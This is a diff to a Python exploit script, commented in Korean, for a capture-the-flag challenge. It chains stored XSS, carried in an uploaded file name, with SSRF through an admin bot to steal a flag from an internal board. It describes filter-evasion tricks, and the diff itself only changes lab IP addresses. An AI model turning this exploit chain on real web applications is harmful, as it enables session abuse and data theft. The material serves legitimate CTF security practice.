@@ -3,12 +3,12 @@
 """
 FSI 채팅 — XSS → SSRF → 내부보드 flag 탈취 (fsi-chat-xss)  ·  대상 http://localhost:9090
 
-[구조]  external-server(172.22.0.3:9090, 공개 게시판)  /  internal-server(172.22.0.4)
+[구조]  external-server(10.111.0.3:9090, 공개 게시판)  /  internal-server(10.111.0.4)
         ├ 내부 게시판 int/app.py(:9090) : getBoardView 가 `where seq="..."` — author 검사 없음
         │   → seq=1 에 admin 글(제목 "flag is here!", 내용 = flag) 이 init.sql 로 시드됨
         └ 관리자 봇 bot.py(:9000) : /report 로 받은 url 을 admin 으로 로그인한 채 방문하고
                                     id="uploadFile" 요소를 click() 한다(셀레늄 headless chrome)
-        db(172.22.0.5) — ext/int 가 공유. 봇은 egress 방화벽으로 172.22.0.3/172.22.0.5 만 통신.
+        db(10.111.0.5) — ext/int 가 공유. 봇은 egress 방화벽으로 10.111.0.3/10.111.0.5 만 통신.
 
 [취약점]  view.html:  <a href="javascript:fileDown('{{filepath}}')" id="uploadFile"> ...
           Jinja 가 ' → &#39; 로 HTML 이스케이프하지만, javascript: URI 는 브라우저가
@@ -19,7 +19,7 @@ FSI 채팅 — XSS → SSRF → 내부보드 flag 탈취 (fsi-chat-xss)  ·  대
 
 [익스 체인]
   1) 공개 보드에 '내용 없는 빈 파일'을 올리되 파일명 자체를 XSS 페이로드로 → board.filepath 에 저장
-  2) /report 로 내부 보드 뷰( http://172.22.0.4:9090/board/<myseq> )를 신고
+  2) /report 로 내부 보드 뷰( http://10.111.0.4:9090/board/<myseq> )를 신고
   3) 봇(admin)이 그 글을 열고 uploadFile 클릭 → 페이로드 실행:
        - 동기 XHR GET /board/1  (author 검사 없음 → admin 으로 flag 열람)
        - flag 추출 후 내부 /write 로 '제목=flag, author=admin' 새 글 작성(공유 DB 기록)
@@ -35,7 +35,7 @@ import sys, re, time
 import requests
 
 BASE     = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9090"
-INT_VIEW = "http://172.22.0.4:9090/board"   # 봇이 도달 가능한 내부 보드(자기 IP, 방화벽 허용)
+INT_VIEW = "http://10.111.0.4:9090/board"   # 봇이 도달 가능한 내부 보드(자기 IP, 방화벽 허용)
 
 # 봇이 클릭으로 실행할 JS.  safeQuery 금지문자( " \ | & [ ] ! @ # $ % )와 '리터럴 /' 를 모두 회피
 #  - '/' 는 String.fromCharCode(47) 로 생성(파일명에 슬래시 truncation/이스케이프 회피)
@@ -73,7 +73,7 @@ def main():
     print("[*] stored XSS post seq=%s  (attacker=%s)" % (seq, uid))
 
     # 3) 내부 보드 뷰를 신고 → admin 봇이 방문/클릭
-    s.post(BASE + "/report", data={"url": "http://172.22.0.4:9090/board/%s" % seq}, timeout=10)
+    s.post(BASE + "/report", data={"url": "http://10.111.0.4:9090/board/%s" % seq}, timeout=10)
     print("[*] reported internal /board/%s → waiting for admin bot ..." % seq)
 
     # 4) 공개 보드 목록에서 봇이 적어낸 flag(제목) 회수
